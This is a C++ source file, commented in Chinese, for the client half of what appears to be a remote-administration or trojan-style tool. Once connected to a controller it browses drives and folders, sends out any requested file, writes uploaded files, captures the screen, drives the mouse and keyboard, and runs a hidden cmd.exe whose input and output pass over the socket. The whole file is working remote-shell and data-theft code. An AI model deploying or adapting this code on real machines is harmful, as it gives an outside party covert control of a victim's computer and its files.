#include "CClientWorks.h"
#include "zlib.h"
#pragma comment(lib, "zlib.lib")

SCREENINFO g_ScreenInfo;
DWORD g_dwFileSize = 0;	 // 发送的总字节数
CClientWorks::CClientWorks()
{
	m_QuitFlag = false;

	// 以下是CMD相关
	m_bCmdRet = false;
	m_hReadOfChild = NULL;
	m_hWriteOfChild = NULL;
	m_hReadOfParent = NULL;
	m_hWriteOfParent = NULL;
}

CClientWorks::~CClientWorks()
{
}

// 启动
BOOL CClientWorks::StartClient(char *szIpAddr, USHORT sProt)
{
	// 打开网络库
	if (!m_socket.Startup())
	{
		cout << "[Client]: 打开网络库失败" << endl;
		return FALSE;
	}

	cout << "[Client]: 打开网络库成功" << endl;

	// 创建socket
	if (!m_socket.CreateSocket())
	{
		cout << "[Client]: 创建socket失败" << endl;
		m_socket.Cleanup();
		return FALSE;
	}

	cout << "[Client]: 创建socket成功" << endl;

	// 连接
	if (!m_socket.ConnectSocket(szIpAddr, sProt))
	{
		cout << "[Client]: 连接socket失败..." << endl;
		Sleep(3000);
		m_socket.CloseSocket();
		m_socket.Cleanup();
		return FALSE;
	}
	cout << "[Client]: socket 连接成功" << endl;
	cout << "[Client]: 客户端与服务器连接中..." << endl;
	Sleep(1000);
	cout << "[Client]: 客户端与服务器连接成功" << endl;
	m_QuitFlag = true;

	// 创建线程，发送心跳包
	HANDLE hThread = CreateThread(NULL, 0, HeartThread, this, 0, NULL);
	CloseHandle(hThread);

	while (m_QuitFlag)
	{
		PACKETHEAD ph;

	// 接收头数据
	int nRet = m_socket.Recv((char *)&ph, sizeof(ph));
	if (nRet <= 0)
	{
		cout << "[Client]: 控制端以关闭, 程序即将退出..." << endl;
		Sleep(2000);
		exit(0);
		break;
	}

	// 解析数据
	ParserCommand(ph);
	}

	return TRUE;
}


// 创建心跳包线程
DWORD WINAPI CClientWorks::HeartThread(LPVOID lpParameter)
{
	CClientWorks *pThis = (CClientWorks *)lpParameter;

	// 发送心跳包
	while (true)
	{
		pThis->m_cs.EnterCS();
		PACKETHEAD ph;
		ph.m_nCmd = PK_HEART_BEAT;
		ph.m_nLen = 0;

		if (!pThis->m_socket.Send((char *)&ph, sizeof(ph)))
		{
			cout << "[Client]: 服务器与客户端连接超时，请检查服务器是否已经下线..." << endl;
			return 0;
		}
		pThis->m_cs.LeaveCS();
	}

	return 0;
}


// 解析命令
void CClientWorks::ParserCommand(PACKETHEAD ph)
{
	switch (ph.m_nCmd)
	{
	case PK_GET_DES_DRIVE:
	{
		// 驱动器
		// 获取文件磁盘
		ParserGetDrive();
		break;
	}
	case PK_GET_FOLDER_NEXT_DATA:
	{
		// 获取下一层文件夹
		ParserGetNextFolder(ph);
		break;
	}
	case PK_GET_FOLDER_PREV_DATA:
	{
		// 获取上一层文件夹
		ParserGetPrevFolder(ph);
		break;
	}
	case PK_DOWN_IS_FILE:
	{
		// 文件下载
		ParserDownloadIsFile(ph);
		break;
	}
	case PK_START_DOWN_FILE:
	{
		// 开始下载文件
		ParserBeginDownFile(ph);
		break;
	}
	case PK_UP_FILE_DATA:
	{
		// 上传文件数据
		ParserUploadFile(ph);
		break;
	}
	case PK_GET_FILE_DATA:
	{
		// 获取文件数据
		ParserGetFileData(ph);
		break;
	}
	case PK_START_CMD:
	{
		// 启动cmd
		ParserStartCmd();
		break;
	}
	case PK_INPUT_CMD_ORDER:
	{
		// cmd命令
		ParserCmdOrder(ph);
		break;
	}
	case PK_QUIT_CMD:
	{
		// 退出cmd
		m_bCmdRet = false;
		break;
	}
	case PK_CLIENT_SCREEN_DATA:
	{
		// 获取客户端屏幕数据
		ParserGetScreenData();
		break;
	}
	case PK_MOUSE_BUTTON_DBLCLK:
	{
		// 鼠标左键双击
		ParserSetClientMousePoint(ph);
		break;
	}
	case PK_QUIT_CLIENT_SCREEN:
	{
		// 屏幕结束
		cout << "[Client]: 服务器退出屏幕监控" << endl;
		break;
	}
	case PK_MOUSE_BUTTON_DOWN:
	{
		// 鼠标左键按下
		ParserMouseButtonDown(ph);
		break;
	}
	case PK_KEYBOARD_INPUT:
	{
		// 键盘输入
		ParserKeyBoardInput(ph);
		break;
	}
	}
}

// 获取屏幕数据发送
void CClientWorks::ParserGetScreenData()
{
	// 获取桌面大小
	int nWndWidth = GetSystemMetrics(SM_CXSCREEN);
	int nWndHeight = GetSystemMetrics(SM_CYSCREEN);

	// 获取桌面dc
	HDC hDeskDc = GetWindowDC(NULL);

	// 创建兼容内存DC
	HDC MemoryDc = CreateCompatibleDC(hDeskDc);

	// 创建兼容位图
	HBITMAP hMap = CreateCompatibleBitmap(hDeskDc,
		GetDeviceCaps(hDeskDc, HORZRES),
		GetDeviceCaps(hDeskDc, VERTRES));

	// 绑定位图
	SelectObject(MemoryDc, hMap);

	BitBlt(MemoryDc, 0, 0, nWndWidth, nWndHeight, hDeskDc, 0, 0, SRCCOPY);

	// 申请存储位图的空间
	int nSize = nWndWidth * nWndHeight * sizeof(COLORREF);
	char *pDestData = new char[nSize];
	ZeroMemory(pDestData, nSize);

	// 给位图上色
	GetBitmapBits(hMap, nSize, pDestData);

	// 压缩文件
	uLongf outSize;
	char *pCompression = new char[nSize];
	ZeroMemory(pCompression, nSize);

	// 压缩
	compress((unsigned char*)pCompression, &outSize, (unsigned char*)pDestData, nSize);

	// 头信息
	PACKETHEAD	SendHead;
	SendHead.m_nCmd = PK_CLIENT_SCREEN_DATA;
	SendHead.m_nLen = 0;

	// 屏幕相关信息
	g_ScreenInfo.m_nWndHeight = nWndHeight;
	g_ScreenInfo.m_nWndWidth = nWndWidth;
	g_ScreenInfo.m_SrcSize = nSize;
	g_ScreenInfo.m_CompressedSize = outSize;

	m_cs.EnterCS();
	// 发送头数据
	m_socket.Send((char*)&SendHead, sizeof(SendHead));

	// 发送屏幕相关信息
	m_socket.Send((char*)&g_ScreenInfo, sizeof(g_ScreenInfo));

	// 发送压缩后的截屏信息
	m_socket.Send(pCompression, outSize);
	m_cs.LeaveCS();

	// 删除数据
	delete[] pCompression;
	delete[] pDestData;

	// 清理资源
	DeleteObject(hMap);
	DeleteDC(MemoryDc);
	ReleaseDC(NULL, hDeskDc);
}

// 获取驱动器发送
void CClientWorks::ParserGetDrive()
{
	DWORD dwSize = GetLogicalDriveStrings(0, NULL);

	char *pBuff = new char[dwSize];
	ZeroMemory(pBuff, dwSize);

	GetLogicalDriveStrings(dwSize, pBuff);

	// 发送头
	PACKETHEAD	SendHead;
	SendHead.m_nCmd = PK_GET_DES_DRIVE;
	SendHead.m_nLen = dwSize;

	m_cs.EnterCS();
	if (!m_socket.Send((char *)&SendHead, sizeof(SendHead)))
	{
		cout << "[Client]: 向服务器发送数据失败" << endl;
		delete[] pBuff;
		return;
	}

	// 发送数据
	if (!m_socket.Send(pBuff, dwSize))
	{
		cout << "[Client]: 向服务器发送数据失败" << endl;
		delete[] pBuff;
		return;
	}
	m_cs.LeaveCS();

	delete[] pBuff;
}

// 获取下一层文件夹
void CClientWorks::ParserGetNextFolder(PACKETHEAD ph)
{
	char *pBuff = new char[ph.m_nLen + 5];
	ZeroMemory(pBuff, ph.m_nLen + 5);

	// 接收头数据
	int nRet = m_socket.Recv(pBuff, ph.m_nLen);

	if (nRet == 0 || nRet == SOCKET_ERROR)
	{
		cout << "[Client]: 接收服务器数据失败" << endl;
		delete[] pBuff;
		return;
	}

	strcat(pBuff, "\\*.*");
	WIN32_FIND_DATA FindFileData = { 0 };
	HANDLE hFindFile = FindFirstFile(pBuff, &FindFileData);

	if (INVALID_HANDLE_VALUE == hFindFile)
	{
		// 没有下一层文件夹
		PACKETHEAD SendHead;
		SendHead.m_nCmd = PK_NO_NEXT_FOLDER;
		SendHead.m_nLen = 0;

		m_cs.EnterCS();
		if (!m_socket.Send((char *)&SendHead, sizeof(SendHead)))
		{
			cout << "[Client]: 向服务器发送数据失败" << endl;
			delete[] pBuff;
			pBuff = NULL;
			return;
		}
		m_cs.LeaveCS();
		return;
	}

	// 有下一层文件夹
	PACKETHEAD NoticeHead;
	NoticeHead.m_nCmd = PK_HAVE_NEXT_FOLDER;
	NoticeHead.m_nLen = 0;

	m_cs.EnterCS();
	if (!m_socket.Send((char *)&NoticeHead, sizeof(NoticeHead)))
	{
		cout << "[Client]: 向服务器发送数据失败" << endl;
		delete[] pBuff;
		pBuff = NULL;
		return;
	}
	m_cs.LeaveCS();

	while (true)
	{
		BOOL bRet = FindNextFile(hFindFile, &FindFileData);

		if (!bRet)
		{
			break;
		}

		// 保存读取到的文件名
		string strFileName = FindFileData.cFileName;

		if (strFileName == "." || strFileName == "..")
		{
			continue;
		}

		// 发送头
		PACKETHEAD Sendph;
		Sendph.m_nCmd = PK_GET_FOLDER_NEXT_DATA;
		Sendph.m_nLen = strFileName.length() + 1;

		m_cs.EnterCS();
		if (!m_socket.Send((char *)&Sendph, sizeof(Sendph)))
		{
			cout << "[Client]: 向服务器发送数据失败" << endl;
			delete[] pBuff;
			pBuff = NULL;
			return;
		}

		// 发送数据
		if (!m_socket.Send(strFileName.c_str(), Sendph.m_nLen))
		{
			cout << "[Client]: 向服务器发送数据失败" << endl;
			delete[] pBuff;
			pBuff = NULL;
			return;
		}
		m_cs.LeaveCS();
	}

	FindClose(hFindFile);
	delete[] pBuff;
	pBuff = NULL;
}

// 获取上一层文件夹
void CClientWorks::ParserGetPrevFolder(PACKETHEAD ph)
{
	char *pBuff = new char[ph.m_nLen + 9];
	ZeroMemory(pBuff, ph.m_nLen + 9);

	// 接收服务器发送的数据协议头
	int nRet = m_socket.Recv(pBuff, ph.m_nLen);

	if (nRet == 0 || nRet == SOCKET_ERROR)
	{
		cout << "[Client]: 接收服务器发送的数据失败" << endl;
		delete[] pBuff;
		return;
	}

	strcat(pBuff, "\\..\\*.*");
	WIN32_FIND_DATA FindFileData = { 0 };
	HANDLE hFindFile = FindFirstFile(pBuff, &FindFileData);

	if (INVALID_HANDLE_VALUE == hFindFile)
	{
		// 没有上一层文件夹
		PACKETHEAD SendHead;
		SendHead.m_nCmd = PK_NO_PREV_FOLDER;
		SendHead.m_nLen = 0;

		m_cs.EnterCS();
		// 发送数据
		if (!m_socket.Send((char *)&ph, sizeof(ph)))
		{
			cout << "[Client]: 向服务器发送数据失败" << endl;
			delete[] pBuff;
			return;
		}
		m_cs.LeaveCS();
		return;
	}

	// 有上一层文件夹
	PACKETHEAD NoticeHead;
	NoticeHead.m_nCmd = PK_HAVE_PREV_FOLDER;
	NoticeHead.m_nLen = 0;

	m_cs.EnterCS();
	if (!m_socket.Send((char *)&NoticeHead, sizeof(NoticeHead)))
	{
		cout << "[Client]: 向服务器发送数据失败" << endl;
		delete[] pBuff;
		return;
	}
	m_cs.LeaveCS();

	while (true)
	{
		BOOL bRet = FindNextFile(hFindFile, &FindFileData);

		if (!bRet)
		{
			break;
		}

		string strFileName = FindFileData.cFileName;
		if (strFileName == "." || strFileName == "..")
		{
			continue;
		}

		// 发送头
		PACKETHEAD Sendph;
		Sendph.m_nCmd = PK_GET_FOLDER_PREV_DATA;
		Sendph.m_nLen = strFileName.length() + 1;

		m_cs.EnterCS();
		if (!m_socket.Send((char *)&Sendph, sizeof(Sendph)))
		{
			cout << "[Client]: 向服务器发送数据失败" << endl;
			delete[] pBuff;
			return;
		}

		// 发送数据
		if (!m_socket.Send(strFileName.c_str(), Sendph.m_nLen))
		{
			cout << "[Client]: 向服务器发送数据失败" << endl;
			delete[] pBuff;
			return;
		}
		m_cs.LeaveCS();
	}

	FindClose(hFindFile);
	delete[] pBuff;
}

// 下载的是否是文件
void CClientWorks::ParserDownloadIsFile(PACKETHEAD ph)
{
	// 申请缓冲区
	char *pBuff = new char[ph.m_nLen];
	ZeroMemory(pBuff, ph.m_nLen);

	// 接收数据
	if (!m_socket.Recv(pBuff, ph.m_nLen))
	{
		cout << "[Client]: 接收服务器数据失败" << endl;
		delete[] pBuff;
		return;
	}

	WIN32_FIND_DATA FindFileData = { 0 };
	HANDLE hFindFile = FindFirstFile(pBuff, &FindFileData);

	if (INVALID_HANDLE_VALUE == hFindFile)
	{
		cout << "[Client]: 打开文件失败" << endl;
		return;
	}

	// 如果是文件夹，发送消息告诉控制端无法下载
	if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
	{
		// 发送所选的下载文件是文件夹
		PACKETHEAD SendHead;
		SendHead.m_nCmd = PK_IS_FOLDER;
		SendHead.m_nLen = 0;

		m_cs.EnterCS();
		if (!m_socket.Send((char *)&SendHead, sizeof(SendHead)))
		{
			cout << "[Client]: 向服务器发送数据失败" << endl;
			return;
		}
		m_cs.LeaveCS();
	}
	// 如果是文件，告诉控制端是文件，你可以进行下载

	else
	{
		// 发送所选的下载文件是文件夹
		PACKETHEAD SendHead;
		SendHead.m_nCmd = PK_IS_FILE;
		SendHead.m_nLen = 0;

		m_cs.EnterCS();
		if (!m_socket.Send((char *)&SendHead, sizeof(SendHead)))
		{
			cout << "[Client]: 发送信息失败" << endl;
			return;
		}
		m_cs.LeaveCS();
	}

	FindClose(hFindFile);
	delete[] pBuff;
}

// 开始下载文件
void CClientWorks::ParserBeginDownFile(PACKETHEAD ph)
{
	// 清空
	g_dwFileSize = 0;
	char* pDownFilePath = new char[ph.m_nLen];
	ZeroMemory(pDownFilePath, ph.m_nLen);

	// 获取服务器发送的所下载文件的路径
	if (!m_socket.Recv(pDownFilePath, ph.m_nLen))
	{
		cout << "[Client]: 获取路径失败" << endl;
		delete[] pDownFilePath;
		return;
	}

	// 打开源文件
	HANDLE hSRcFile = CreateFile(pDownFilePath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	// 清空缓冲区
	delete[] pDownFilePath;
	pDownFilePath = NULL;

	// 打开文件失败
	if (hSRcFile == INVALID_HANDLE_VALUE)
	{
		cout << "[Client]: 下载文件时，打开文件路径失败" << endl;
		// 关闭文件
		CloseHandle(hSRcFile);
		return;
	}

	// 获取要下载文件的总字节数
	LARGE_INTEGER lSrcFileSize = { 0 };
	BOOL bRet = GetFileSizeEx(hSRcFile, &lSrcFileSize);

	if (!bRet)
	{
		cout << "[Client]: 获取下载文件的字节大小失败" << endl;
		// 关闭文件
		CloseHandle(hSRcFile);
		return;
	}

	// 发送文件大小
	PACKETHEAD SendFileSizeph;
	SendFileSizeph.m_nCmd = PK_GET_FILE_SIZE; // 向服务器发送所下载文件的总字节大小
	SendFileSizeph.m_nLen = 0;

	m_cs.EnterCS();
	if (!m_socket.Send((char *)&SendFileSizeph, sizeof(SendFileSizeph)))
	{
		cout << "[Client]: 向服务器发送文件字节大小失败" << endl;
		return;
	}
	// 发送所下载文件的总字节大小
	if (!m_socket.Send((char *)&lSrcFileSize, sizeof(lSrcFileSize)))
	{
		cout << "[Client]: 向服务器发送文件字节大小失败" << endl;
		return;
	}
	m_cs.LeaveCS();

	// 循环发送文件数据
	const int nCopySize = 0x10000;
	while (true)
	{
		char szBuff[nCopySize] = { 0 };
		// 存储读取到的文件字节数
		DWORD dwBytesToRead = 0;
		Sleep(200);
		// 读取文件数据
		bRet = ReadFile(hSRcFile, szBuff, nCopySize, &dwBytesToRead, NULL);

		if (!bRet)
		{
			cout << "[Client]: 读取数据失败" << endl;
			CloseHandle(hSRcFile);
			return;
		}

		// 发送读取到的文件数据
		PACKETHEAD DataHead;
		DataHead.m_nCmd = PK_GET_FILE_DATA;
		DataHead.m_nLen = dwBytesToRead;

		m_cs.EnterCS();
		// 发送头
		if (!m_socket.Send((char *)&DataHead, sizeof(DataHead)))
		{
			cout << "[Client]: 向服务器发送文件字节大小失败" << endl;
			return;
		}

		// 发送读取到的文件数据
		if (!m_socket.Send(szBuff, dwBytesToRead))
		{
			cout << "[Client]: 向服务器发送文件字节大小失败" << endl;
			return;
		}
		m_cs.LeaveCS();

		//cout << "[Client]: 向服务器发送文件字节数：" << dwBytesToRead << endl;
		// 记录每次发送的数据文件数据长度
		g_dwFileSize += dwBytesToRead;

		// 读取到文件尾 -- 不在读取下一条数据
		if (dwBytesToRead < nCopySize)
		{
			break;
		}

		// 等待服务器接收数据后，发送下一次数据
		PACKETHEAD HeadNext;
		if (!m_socket.Recv((char *)&HeadNext, sizeof(HeadNext)))
		{
			cout << "[Client]: 接收数据失败" << endl;
			return;
		}

		if (HeadNext.m_nCmd != PK_GET_FILE_NEXT_DATA)
		{
			return;
		}
	}
	// 文件数据发送完毕，关闭文件句柄
	CloseHandle(hSRcFile);

	cout << "[Client]: 向服务器发送文件总字节数：" << g_dwFileSize << endl;

	//	文件下载成功，给服务器发送消息
	PACKETHEAD Sendph;
	Sendph.m_nCmd = PK_DOWN_FILE_SUCC;
	Sendph.m_nLen = 0;

	m_cs.EnterCS();
	if (!m_socket.Send((char *)&Sendph, sizeof(Sendph)))
	{
		cout << "[Client]: 向服务器发送文件字节大小失败" << endl;
		return;
	}
	m_cs.LeaveCS();
}

// 上传文件
void CClientWorks::ParserUploadFile(PACKETHEAD ph)
{
	char* pUpFilePath = new char[ph.m_nLen];
	ZeroMemory(pUpFilePath, ph.m_nLen);

	// 接收服务器发送的文件上传路径
	if (!m_socket.Recv(pUpFilePath, ph.m_nLen))
	{
		cout << "[Client]: 获取上传文件路径失败" << endl;
		delete[] pUpFilePath;
		return;
	}

	// 创建目标文件
	HANDLE hDstFile = CreateFile(pUpFilePath,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (INVALID_HANDLE_VALUE == hDstFile)
	{
		cout << "[Client]: 上传文件时，所创建路径失败" << endl;
		delete[] pUpFilePath;
		return;
	}

	LARGE_INTEGER lSrcFileSize = { 0 };
	BOOL bRet = GetFileSizeEx(hDstFile, &lSrcFileSize);

	m_strUploadFilePath = pUpFilePath;
	CloseHandle(hDstFile);

	delete[] pUpFilePath;

	// 索要下一条数据
	PACKETHEAD Getph;
	Getph.m_nCmd = PK_GET_FILE_NEXT_DATA;
	Getph.m_nLen = 0;

	m_cs.EnterCS();
	if (!m_socket.Send((char *)&Getph, sizeof(Getph)))
	{
		cout << "[Client]: 向服务器发送文件字节大小失败" << endl;
		return;
	}

	// 发送文件大小
	if (!m_socket.Send((char *)&lSrcFileSize, sizeof(LARGE_INTEGER)))
	{
		cout << "[Client]: 向服务器发送文件字节大小失败" << endl;
		return;
	}
	m_cs.LeaveCS();
}

// 获取上传文件的数据
void CClientWorks::ParserGetFileData(PACKETHEAD ph)
{
	// 申请存储空间
	char* pBuff = new char[ph.m_nLen];
	ZeroMemory(pBuff, ph.m_nLen);

	int nTotal = ph.m_nLen;
	int nCurSize = 0;

	// 接收文件数据
	while (nCurSize != nTotal)
	{
		int nRetByte = m_socket.Recv(pBuff + nCurSize, nTotal - nCurSize);
		if (nRetByte <= 0)
		{
			return;
		}
		nCurSize += nRetByte;
	}

	HANDLE hDstFile = CreateFile(m_strUploadFilePath.c_str(),
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	// 设置文件指针到尾部
	SetFilePointer(hDstFile, 0, 0, FILE_END);

	// 写入文件数据
	DWORD dwWriteSize = 0;
	WriteFile(hDstFile, pBuff, ph.m_nLen, &dwWriteSize, NULL);

	// 获取文件大小
	LARGE_INTEGER lSrcFileSize = { 0 };
	BOOL bRet = GetFileSizeEx(hDstFile, &lSrcFileSize);

	CloseHandle(hDstFile);
	delete[] pBuff;

	// 获取文件的下一部分数据
	PACKETHEAD Getph;
	Getph.m_nCmd = PK_GET_FILE_NEXT_DATA;
	Getph.m_nLen = 0;

	m_cs.EnterCS();
	// 向服务器发送请求
	if (!m_socket.Send((char *)&Getph, sizeof(Getph)))
	{
		cout << "[Client]: 向服务器发送数据失败" << endl;
		return;
	}

	// 发送文件字节大小
	if (!m_socket.Send((char *)&lSrcFileSize, sizeof(LARGE_INTEGER)))
	{
		cout << "[Client]: 向服务器发送数据失败" << endl;
		return;
	}
	m_cs.LeaveCS();
}

// 移动客户端鼠标到指定位置
void CClientWorks::ParserSetClientMousePoint(PACKETHEAD head)
{
	char* pBuff = new char[head.m_nLen];
	ZeroMemory(pBuff, head.m_nLen);

	// 接收服务器发送的数据
	if (!m_socket.Recv(pBuff, head.m_nLen))
	{
		cout << "[Client]: 获取鼠标坐标失败" << endl;
		delete[] pBuff;
		return;
	}
	int nIdx;
	string str;
	str = pBuff;
	nIdx = str.find("-");

	// 解析坐标
	char szBuffX[20] = { 0 };
	char szBuffY[20] = { 0 };
	memcpy(szBuffX, pBuff, nIdx);
	memcpy(szBuffY, pBuff + nIdx+ 1, strlen(pBuff));

	int nMouseX = atoi(szBuffX);
	int nMouseY = atoi(szBuffY);
	// 将客户端鼠标移动到指定位置
	BOOL bRet = ::SetCursorPos(nMouseX, nMouseY);
	if (bRet)
	{
		// 鼠标左键按下弹起
		::mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, nMouseX, nMouseY, 0, 0);
		Sleep(20);
		::mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, nMouseX, nMouseY, 0, 0);
	}
	return;
}

// 鼠标左键单击
void CClientWorks::ParserMouseButtonDown(PACKETHEAD head)
{
	char* pBuff = new char[head.m_nLen];
	ZeroMemory(pBuff, head.m_nLen);

	// 接收服务器发送的数据
	if (!m_socket.Recv(pBuff, head.m_nLen))
	{
		cout << "[Client]: 获取鼠标坐标失败" << endl;
		delete[] pBuff;
		return;
	}
	int nIdx;
	string str;
	str = pBuff;
	nIdx = str.find("-");

	// 解析坐标
	char szBuffX[20] = { 0 };
	char szBuffY[20] = { 0 };
	memcpy(szBuffX, pBuff, nIdx);
	memcpy(szBuffY, pBuff + nIdx + 1, strlen(pBuff));

	int nMouseX = atoi(szBuffX);
	int nMouseY = atoi(szBuffY);
	// 将客户端鼠标移动到指定位置
	BOOL bRet = ::SetCursorPos(nMouseX, nMouseY);
	if (bRet)
	{
		// 鼠标左键单击 -- 按下弹起
		mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
	}
	return;
}

// 键盘输入
void CClientWorks::ParserKeyBoardInput(PACKETHEAD head)
{
	char* pBuff = new char[head.m_nLen];
	ZeroMemory(pBuff, head.m_nLen);

	// 接收服务器发送的数据
	if (!m_socket.Recv(pBuff, head.m_nLen))
	{
		cout << "[Client]: 获取上传文件路径失败" << endl;
		delete[] pBuff;
		return;
	}
	// 顶部数字键
	char szBuff[2] = { 0 };
	memcpy(szBuff, pBuff, strlen(pBuff));
	if (szBuff[0] >= '0' && szBuff[0] <= '9')
	{
		keybd_event(szBuff[0], 0, 0, 0);
		keybd_event(szBuff[0], 0, KEYEVENTF_KEYUP, 0);
	}
	// 字母大写键
	if (szBuff[0] >= 'A' && szBuff[0] <= 'Z')
	{
		keybd_event(szBuff[0], 0, 0, 0);
		keybd_event(szBuff[0], 0, KEYEVENTF_KEYUP, 0);
	}
	// 字母小写键
	if (szBuff[0] >= 'a' && szBuff[0] <= 'z')
	{
		keybd_event(szBuff[0], 0, 0, 0);
		keybd_event(szBuff[0], 0, KEYEVENTF_KEYUP, 0);
	}
}

// 匹配到CMD启动
void CClientWorks::ParserStartCmd()
{
	BOOL bRet = FALSE;

	// 安全属性
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	// 创建主管道
	bRet = CreatePipe(&m_hReadOfParent, &m_hWriteOfChild, &sa, 0);
	if (!bRet)
	{
		cout << "[Client]: 创建管道失败" << endl;
		return;
	}

	// 创建子管道
	bRet = CreatePipe(&m_hReadOfChild, &m_hWriteOfParent, &sa, 0);
	if (!bRet)
	{
		cout << "[Client]: 创建管道失败" << endl;
		return;
	}

	// 打开客户端CMD进程
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = m_hReadOfChild;
	si.hStdOutput = m_hWriteOfChild;
	si.hStdError = m_hWriteOfChild;

	_PROCESS_INFORMATION pi = { 0 };

	// 创建CMD进程
	bRet = CreateProcess(NULL,
		"cmd.exe",
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi);

	if (!bRet)
	{
		OutputDebugString("创建进程失败！");
		return;
	}

	// 创建线程
	HANDLE hThread = CreateThread(NULL, 0, CmdWorkThread, this, 0, NULL);

	if (hThread == NULL)
	{
		cout << "[Client]: 创建cmd线程失败" << endl;
		return;
	}
	cout << "[Client]: cmd 启动成功" << endl;

	// 关闭句柄
	CloseHandle(hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

// 创建管道接收数据
DWORD WINAPI CClientWorks::CmdWorkThread(LPVOID lpParameter)
{
	CClientWorks* pThis = (CClientWorks *)lpParameter;

	pThis->m_bCmdRet = true;

	while (pThis->m_bCmdRet)
	{
		DWORD dwAail = 0; // 管道中剩余的字节数
		BOOL bRet = PeekNamedPipe(pThis->m_hReadOfParent, NULL, 0, NULL, &dwAail, NULL);

		if (dwAail > 0)
		{
			// 申请空间
			char* pBuff = new char[dwAail + 1];
			memset(pBuff, 0, dwAail + 1);

			// 从管道中读取数据
			ReadFile(pThis->m_hReadOfParent, pBuff, dwAail, &dwAail, NULL);

			// 将读取的数据发送到客户端

			// 先发送包头
			PACKETHEAD ph;
			ph.m_nCmd = PK_OUTPUT_CMD_DATA;
			ph.m_nLen = dwAail + 1;

			pThis->m_cs.EnterCS();
			if (!pThis->m_socket.Send((char *)&ph, sizeof(ph)))
			{
				cout << "[Client]: 向服务器发送数据失败" << endl;
				delete[] pBuff;
				return 0;
			}


			if (!pThis->m_socket.Send(pBuff, dwAail + 1))
			{
				cout << "[Client]: 向服务器发送数据失败" << endl;
				delete[] pBuff;
				return 0;
			}
			pThis->m_cs.LeaveCS();

			// 释放缓冲区
			delete[] pBuff;
		}
	}

	pThis->m_hReadOfChild = NULL;
	pThis->m_hWriteOfChild = NULL;
	pThis->m_hReadOfParent = NULL;
	pThis->m_hWriteOfParent = NULL;

	return 0;
}

// 匹配到CMD命令
void CClientWorks::ParserCmdOrder(PACKETHEAD ph)
{
	// 申请缓冲区
	char* pBuff = new char[ph.m_nLen];
	ZeroMemory(pBuff, ph.m_nLen);
	// 接收数据
	int nRet = m_socket.Recv(pBuff, ph.m_nLen);
	if (nRet <= 0)
	{
		cout << "[Client]: 获取服务器输入cmd命令失败" << endl;
		delete[] pBuff;
		return;
	}

	// 将数据写入管道中
	DWORD dwWriteBytes = 0;
	WriteFile(m_hWriteOfParent, pBuff, ph.m_nLen, &dwWriteBytes, NULL);
	// 释放缓冲区
	delete[] pBuff;
}